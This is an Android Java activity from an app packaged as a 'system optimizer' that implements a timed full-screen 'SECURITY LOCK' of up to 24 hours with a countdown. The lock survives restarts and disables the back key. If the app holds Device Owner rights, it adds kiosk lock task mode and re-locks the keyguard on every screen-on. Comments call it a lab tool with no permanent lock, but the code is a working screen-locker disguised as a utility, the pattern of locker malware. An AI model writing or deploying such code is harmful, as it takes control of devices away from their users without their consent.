package com.example.systemoptimizer;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.KeyEvent;
import android.view.Window;
import android.view.WindowManager;
import android.widget.TextView;

import java.util.Locale;

/**
 * حجب الشاشة المؤقّت بعرض "SECURITY LOCK".
 *
 * قفل زمني (1-86400 ثانية) بنمط أمني/رقابي:
 * - الشاشة سوداء بتصميم cybersecurity وعدّاد تنازلي كبير.
 * - يحفظ الموعد النهائي في SharedPreferences، فيُصمد القفل أمام إعادة إنشاء
 *   النشاط/تدوير الشاشة.
 * - عند انتهاء المدة: يُوقف القفل، تُزال الواجهة، ويعود الجهاز لحالته الطبيعية.
 *
 * إذا كان التطبيق Device Owner (يدوياً عبر adb في بيئة المختبر المعزولة):
 * - يفعّل lock task (كشك) عبر setLockTaskPackages + startLockTask، فيمنع
 *   Home/Overview من فك الحجب.
 * - يعيد قفل keyguard عبر lockNow() عند كل فتح للشاشة، مع بقاء القفل مؤقتاً.
 *
 * إن لم يكن Device Owner متاحاً، يبقى قفل ملء-الشاشة على مستوى التطبيق (تطبيق
 * عادي لا يمكنه فرض قفل نظام حقيقي) — لا تُستخدم ثغرات أو حيل Accessability،
 * ولا يُدَّعى نجاح قيد يتطلب صلاحيات مُدارة.
 *
 * لا يوجد حجب دائم، ولا إزالة مضادة للتثبيت، ولا عرقلة لأدوات الاسترداد.
 */
public class BlockScreenActivity extends Activity {

    public static final String EXTRA_DEADLINE_EPOCH_MS = "block_deadline_epoch_ms";
    private static final String PREFS_NAME = "system_optimizer_prefs";
    private static final String PREFS_DEADLINE = "block_screen_deadline_ms";
    private static final String PREFS_ACTIVE = "block_screen_active";
    private static final long MAX_DURATION_SECONDS = 86400L;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private TextView countdownView;
    private Runnable ticker;

    private DevicePolicyManager dpm;
    private boolean deviceOwner;

    private final BroadcastReceiver screenEvents = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (Intent.ACTION_SCREEN_ON.equals(action) || Intent.ACTION_USER_PRESENT.equals(action)) {
                // القفل لم ينتهِ: أعد إشهار الـ keyguard (Device Owner فقط)
                if (isBlockStillActive() && deviceOwner) {
                    relock();
                }
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        setContentView(R.layout.activity_block_screen);
        countdownView = findViewById(R.id.block_countdown_text);

        dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        deviceOwner = dpm != null && dpm.isDeviceOwnerApp(getPackageName());

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        long deadline = getIntent().getLongExtra(EXTRA_DEADLINE_EPOCH_MS, 0);
        if (deadline <= 0) {
            deadline = prefs.getLong(PREFS_DEADLINE, 0);
        }
        if (incomingDeadlineValid(deadline)) {
            prefs.edit().putLong(PREFS_DEADLINE, deadline)
                    .putBoolean(PREFS_ACTIVE, true).apply();
        } else if (!prefs.getBoolean(PREFS_ACTIVE, false)) {
            // لا يوجد قفل نشط/صالح: انتهاء فوري
            finish();
            return;
        }
        deadline = prefs.getLong(PREFS_DEADLINE, System.currentTimeMillis());

        if (deviceOwner) {
            enableManagedLock();
        }

        updateDisplay();
        ticker = new Runnable() {
            @Override
            public void run() {
                if (!isBlockStillActive()) {
                    releaseBlock();
                    return;
                }
                updateDisplay();
                handler.postDelayed(this, 1000);
            }
        };
        handler.post(ticker);
    }

    private boolean incomingDeadlineValid(long deadline) {
        return deadline > System.currentTimeMillis()
                && deadline - System.currentTimeMillis() < MAX_DURATION_SECONDS * 1000L;
    }

    private boolean isBlockStillActive() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        if (!prefs.getBoolean(PREFS_ACTIVE, false)) {
            return false;
        }
        long deadline = prefs.getLong(PREFS_DEADLINE, 0);
        if (deadline <= 0) {
            return false;
        }
        return System.currentTimeMillis() < deadline;
    }

    private void enableManagedLock() {
        try {
            dpm.setLockTaskPackages(new android.content.ComponentName(this, DeviceAdminReceiver.class), new String[]{getPackageName()});
            startLockTask();
        } catch (Exception e) {
            // ليست ممنوحة في هذا السياق: نستمر بقفل ملء-الشاشة بدون كشك
            deviceOwner = false;
        }
        try {
            relock();
        } catch (Exception ignored) {
        }
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        registerReceiver(screenEvents, filter);
    }

    private void relock() {
        try {
            dpm.lockNow();
        } catch (Exception e) {
            // قفل keyguard متاح فقط للـ Device Owner/المسؤول
        }
    }

    private void releaseBlock() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        prefs.edit().putBoolean(PREFS_ACTIVE, false).apply();
        if (deviceOwner) {
            try {
                stopLockTask();
                dpm.setLockTaskPackages(new android.content.ComponentName(this, DeviceAdminReceiver.class), new String[]{});
            } catch (Exception ignored) {
            }
        }
        try {
            unregisterReceiver(screenEvents);
        } catch (Exception ignored) {
        }
        finish();
    }

    private void updateDisplay() {
        long remaining = Math.max(0L, getRemainingSeconds());
        long mins = remaining / 60;
        long secs = remaining % 60;
        countdownView.setText(String.format(Locale.US, "%02d:%02d", mins, secs));
    }

    private long getRemainingSeconds() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        long deadline = prefs.getLong(PREFS_DEADLINE, 0);
        return (deadline - System.currentTimeMillis() + 999L) / 1000L;
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            // القفل يستمر حتى انتهاء المدة (مقابل التحكم الإشرافي)
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacks(ticker);
        try {
            unregisterReceiver(screenEvents);
        } catch (Exception ignored) {
        }
        super.onDestroy();
    }
}